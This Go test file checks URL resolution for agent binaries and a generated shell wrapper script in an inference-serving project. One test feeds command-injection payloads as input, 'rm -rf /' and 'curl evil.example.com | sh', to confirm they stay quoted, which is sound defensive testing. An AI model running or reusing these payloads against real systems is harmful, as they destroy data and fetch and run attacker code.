package engineagent

import (
	"strings"
	"testing"

	"github.com/inference-book/inference-plane/internal/version"
)

func pinVersion(t *testing.T, v string) {
	t.Helper()
	orig := version.Version
	version.Version = v
	t.Cleanup(func() { version.Version = orig })
}

// A dev build has no published artifact. Saying so is better than handing a
// pod a "latest" URL and letting it fetch an agent from a different version
// than the control plane it registers with.
func TestBinaryURLUnavailableOnDevBuild(t *testing.T) {
	pinVersion(t, "dev")
	t.Setenv(EnvBinaryURL, "")

	if url, ok := BinaryURL("amd64"); ok {
		t.Errorf("BinaryURL = %q, ok=true on a dev build; want unavailable", url)
	}
}

func TestBinaryURLFromRelease(t *testing.T) {
	pinVersion(t, "v0.2.3")
	t.Setenv(EnvBinaryURL, "")

	url, ok := BinaryURL("amd64")
	if !ok {
		t.Fatal("BinaryURL unavailable on a released build")
	}
	// Pinned against the workflow's asset names. The two are a pair, and a
	// change to either without the other means pods fetch a 404.
	const want = "https://github.com/inference-book/inference-plane/releases/download/v0.2.3/iplane-linux-amd64"
	if url != want {
		t.Errorf("BinaryURL = %q, want %q", url, want)
	}
}

func TestBinaryURLArchIsHonoured(t *testing.T) {
	pinVersion(t, "v0.2.3")
	t.Setenv(EnvBinaryURL, "")

	url, _ := BinaryURL("arm64")
	if !strings.HasSuffix(url, "iplane-linux-arm64") {
		t.Errorf("BinaryURL = %q, want an arm64 asset", url)
	}
}

// The override is what makes an agent from an untagged working tree
// possible at all, so it has to win even on a dev build.
func TestBinaryURLOverrideWinsOnDevBuild(t *testing.T) {
	pinVersion(t, "dev")
	t.Setenv(EnvBinaryURL, "https://example.com/my-iplane")

	url, ok := BinaryURL("amd64")
	if !ok || url != "https://example.com/my-iplane" {
		t.Errorf("BinaryURL = %q, ok=%v; want the override", url, ok)
	}
}

// exec, not spawn: the engine replaces the shell as the container's main
// process, so the container's lifetime tracks the engine exactly as it did
// before a wrapper existed.
func TestWrapperScriptExecsTheEngine(t *testing.T) {
	got, err := WrapperScript("https://example.com/iplane", []string{"vllm", "serve"})
	if err != nil {
		t.Fatal(err)
	}

	if !strings.Contains(got, `exec 'vllm' 'serve' "$@"`) {
		t.Errorf("script does not exec the engine with forwarded args:\n%s", got)
	}
	// The engine must come last: anything after the exec would never run.
	if idx := strings.Index(got, "exec "); idx == -1 || strings.Contains(got[idx:], "\n") {
		t.Errorf("exec is not the final line:\n%s", got)
	}
}

// An engine that can serve tokens must never fail to start because its
// observability did not install.
func TestWrapperScriptSwallowsAgentFailure(t *testing.T) {
	got, err := WrapperScript("https://example.com/iplane", []string{"vllm", "serve"})
	if err != nil {
		t.Fatal(err)
	}

	if !strings.Contains(got, "|| true") {
		t.Errorf("agent block is not best-effort:\n%s", got)
	}
	if !strings.Contains(got, "&") {
		t.Errorf("agent is not backgrounded:\n%s", got)
	}
}

// These strings are operator-supplied and land in a script a shell parses.
// An unquoted value carrying a semicolon would be command injection into
// the container's own entrypoint.
func TestWrapperScriptQuotesHostileInput(t *testing.T) {
	got, err := WrapperScript(
		"https://example.com/x; rm -rf /",
		[]string{"vllm", "serve; curl evil.example.com | sh"})
	if err != nil {
		t.Fatal(err)
	}

	// The payload is allowed to appear, but only ever inside single quotes.
	// Anywhere it appears unquoted, the shell would run it.
	if !strings.Contains(got, `'https://example.com/x; rm -rf /'`) {
		t.Errorf("url was not single-quoted:\n%s", got)
	}
	for line := range strings.SplitSeq(got, "\n") {
		if strings.Contains(line, "rm -rf /") &&
			!strings.Contains(line, `'https://example.com/x; rm -rf /'`) {
			t.Errorf("url payload escaped its quotes on: %q", line)
		}
	}
	if !strings.Contains(got, `'serve; curl evil.example.com | sh'`) {
		t.Errorf("engine arg was not single-quoted:\n%s", got)
	}
}

func TestWrapperScriptEscapesEmbeddedQuotes(t *testing.T) {
	got, err := WrapperScript("https://example.com/iplane", []string{"sh", "it's"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, `'it'\''s'`) {
		t.Errorf("embedded single quote not escaped:\n%s", got)
	}
}

func TestWrapperScriptRequiresBothInputs(t *testing.T) {
	if _, err := WrapperScript("", []string{"vllm"}); err == nil {
		t.Error("want an error with no binary url")
	}
	if _, err := WrapperScript("https://example.com/iplane", nil); err == nil {
		t.Error("want an error with no engine entrypoint")
	}
}

// Both fetchers are plausible and neither is guaranteed in an engine image.
func TestWrapperScriptTriesCurlAndWget(t *testing.T) {
	got, _ := WrapperScript("https://example.com/iplane", []string{"vllm"})

	if !strings.Contains(got, "curl") || !strings.Contains(got, "wget") {
		t.Errorf("script does not fall back between fetchers:\n%s", got)
	}
}
